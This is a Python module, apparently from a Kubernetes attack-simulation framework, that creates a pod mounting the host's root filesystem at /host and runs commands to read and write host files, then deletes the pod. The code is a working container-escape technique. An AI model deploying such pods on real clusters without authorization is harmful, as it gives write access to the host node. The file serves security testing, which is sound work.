from testing.testing import Testing
import time

class WriteableHostpath(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Writable hostPath mount"
        self.mitre_tactic = "TA0003"
        self.mitre_technique = "T1053.007"
        self.microsoft_technique = "MS-TA9014"
        self.pod = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "writeable-host-path-pod"
            },
            "spec": {
                "containers": [
                    {
                        "image": "ubuntu:latest",
                        "name": "ubuntu",
                        "command": ["/bin/sh", "-c", "sleep 9999"],
                        "volumeMounts": [
                            {
                                "mountPath": "/host",
                                "name": "my-volume"
                            }
                        ]
                    }
                ],
                "volumes": [
                    {
                        "name": "my-volume",
                        "hostPath": {
                            "path": "/"
                        }
                    }
                ]
            }
        }
        self.commands = [
            ["cat /etc/hostname"],
            ["cat /host/etc/hostname"],
            ["touch /host/x.txt"],
            ["ls -lah /host/x.txt"]
        ]

    def run_attack(self):
        if self.check_install_kubectl():
            # Creating Pod writeable-host-path-pod
            print("# Creating Pod writeable-host-path-pod...")
            self.kubectl_create_file("writeable-host-path-pod.yaml", self.pod)
            self.kubectl_apply("writeable-host-path-pod.yaml")
        

            # Wait for the pod to be ready
            while not self.kubectl_is_pod_ready("writeable-host-path-pod"):
                time.sleep(1)
                           

            # Attack
            print("\n# Access the host systems file system...")
            
            for cmd in self.commands:
                print("\n# Executing", ''.join(cmd), "on pod...")
                print("root@writeable-host-path-pod:/#", ' '.join(cmd))
                self.cmd = ["kubectl", "exec", "-i", "writeable-host-path-pod", "--", "bash"]
                output, error = self.kubctl_exec(''.join(cmd))
                print(output)
                print(error)
                
                if self.error:
                    print("An Error has occured: " + error)
                else:
                    self.output[' '.join(cmd)] = output
                    self.command.append(cmd)
            # Cleanup
            self.cleanup()
         

    def cleanup(self):
        print("\n# Deleting writeable-host-path-pod...") 
        self.kubectl_delete("writeable-host-path-pod")
        
        print("\n# Deleting writeable-host-path-pod.yaml...")
        self.delete_file("writeable-host-path-pod.yaml")

    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass